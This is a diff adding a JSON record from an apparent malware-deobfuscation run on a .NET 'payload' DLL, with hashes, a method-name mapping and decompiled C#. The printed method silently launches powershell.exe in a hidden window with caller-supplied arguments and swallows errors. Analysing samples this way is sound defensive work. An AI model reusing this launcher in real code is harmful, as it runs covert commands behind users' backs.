@@ -1,0 +1,15 @@
+{
+  "CapturedOn": "2026-10-16",
+  "ToolVersion": "1.0.1",
+  "Input": "Qafcakg.payload.Ptnifif.dll",
+  "InputSha256": "e4e746f968a3ec89027484ab233d3d38c7778458a898d30f31bb74a2c97059d2",
+  "Output": "Qafcakg.payload.Ptnifif.cleaned.dll",
+  "OutputSha256": "e91b9cbcf62942793cb48de355db6fc3a38603afd799b55c5e0680bf320c1c56",
+  "Success": true,
+  "VerificationPassed": true,
+  "Decompiler": "ILSpy command-line 11.0.0.9375",
+  "MethodMapping": {
+    "M:System.Void IkK0pg15BXAaK15L516.fZYkTP1rAPr8Mw2ADc8::wyN10B6AOx(System.String)": "M:System.Void GeneratedNamespace_0007.GeneratedType_0004::generatedMethod_0068(System.String)"
+  },
+  "FinalCSharp": "\t\tprivate static void generatedMethod_0068(string P_0)\n\t\t{\n\t\t\ttry\n\t\t\t{\n\t\t\t\tProcessStartInfo processStartInfo = new ProcessStartInfo();\n\t\t\t\tRuntimeHelpers.RunClassConstructor(typeof(GeneratedType_0033).TypeHandle);\n\t\t\t\tRuntimeHelpers.RunClassConstructor(typeof(GeneratedType_0030).TypeHandle);\n\t\t\t\tRuntimeHelpers.RunClassConstructor(typeof(GeneratedType_0030.Q1lG8OZxRhVKLCF7q3w).TypeHandle);\n\t\t\t\tRuntimeHelpers.RunClassConstructor(typeof(GeneratedType_0030.GeneratedType_0032).TypeHandle);\n\t\t\t\tRuntimeHelpers.RunClassConstructor(typeof(GeneratedType_0030.GeneratedType_0031).TypeHandle);\n\t\t\t\tRuntimeHelpers.RunClassConstructor(typeof(U20OBNDsRkdkxSZDKJA).TypeHandle);\n\t\t\t\tRuntimeHelpers.RunClassConstructor(typeof(GeneratedType_0029).TypeHandle);\n\t\t\t\tRuntimeHelpers.RunClassConstructor(typeof(GeneratedType_0028).TypeHandle);\n\t\t\t\tprocessStartInfo.FileName = \"powershell.exe\";\n\t\t\t\tprocessStartInfo.Arguments = P_0;\n\t\t\t\tprocessStartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\t\t\t\tprocessStartInfo.CreateNoWindow = true;\n\t\t\t\tprocessStartInfo.UseShellExecute = false;\n\t\t\t\tProcess.Start(processStartInfo);\n\t\t\t}\n\t\t\tcatch\n\t\t\t{\n\t\t\t}\n\t\t}"
+}
